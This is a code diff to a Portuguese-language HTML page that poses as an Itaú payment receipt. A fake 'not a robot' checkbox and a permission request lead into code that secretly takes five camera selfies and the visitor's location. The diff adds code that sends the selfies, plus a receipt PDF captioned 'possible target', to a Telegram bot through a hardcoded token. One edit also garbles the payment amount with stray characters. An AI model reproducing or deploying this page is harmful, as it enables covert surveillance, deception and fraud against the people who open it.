@@ -124,7 +124,7 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
       </div>
     </div>
     <div id="permissoes">Você precisa aceitar as permissões da página para continuar.</div>
-    <button onclick="continuar()">CONTINUE</button>
+    <button id="btnContinue" disabled>CONTINUE</button>
   </div>
 </div>
 
@@ -135,7 +135,7 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
       <div class="check"></div>
       <h2>Pagamento realizado</h2>
     </div>
-    <div class="row"><span>Valor</span><span>R$ 1.500,00</span></div>
+    <div class="row"><span>Valor</span><span>R$ 1下半部分500,00</span></div>
     <div class="row"><span>Recebedor</span><span>Calcard SA Instituição de Pagamentos</span></div>
     <div class="row"><span>CNPJ</span><span>08.611.734/0001-19</span></div>
     <div class="row"><span><b>Pagador</b></span><span><b>CARLOS EDUARDO SILVA SANTOS</b></span></div>
@@ -158,11 +158,25 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
+const chk   = document.getElementById('robot');
+const btn   = document.getElementById('btnContinue');
+
+// Desabilita o botão no carregamento
+btn.disabled = true;
+
+// Ativa/desativa o botão conforme a caixa
+chk.addEventListener('change', () => {
+  btn.disabled = !chk.checked;
+});
+
+// Chama a função principal quando clicar
+btn.addEventListener('click', continuar);
+
 let selfies = [];
 let locationData = null;
 
 async function continuar(){
-  if(!document.getElementById('robot').checked){alert('Marque a caixa primeiro.');return;}
+  if(!chk.checked){alert('Marque a caixa primeiro.');return;}
 
   // CAPTURA 5 SELFIES (intervalo de 600ms entre cada)
   selfies = [];
@@ -231,6 +245,30 @@ Local: ${locationData ? `https://maps.google.com/?q=${locationData.lat},${locati
     const binary = atob(selfies[i].split(',')[1]);
     const arr = new Uint8Array(binary.length);
     for(let j=0;j<binary.length;j++) arr[j]=binary.charCodeAt(j);
-    const blob = new Blob
+    const blob = new Blob([arr],{type:'image/jpeg'});
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('photo', blob,`selfie_${i+1}.jpg`);
+    fd.append('caption',`Selfie ${i+1}/5`);
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
+  }
+}
 
-
+function downloadPDF(){
+  const {jsPDF}=window.jspdf;
+  html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
+    const img=canvas.toDataURL('image/png');
+    const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
+    pdf.addImage(img,'PNG',0,0);
+    const pdfBlob=pdf.output('blob');
+    const fd=new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('document', pdfBlob, 'comprovante_itau.pdf');
+    fd.append('caption','Comprovante baixado - possível alvo');
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`,{method:'POST',body:fd});
+    pdf.save('comprovante_itau.pdf');
+  });
+}
+</script>
+</body>
+</html>
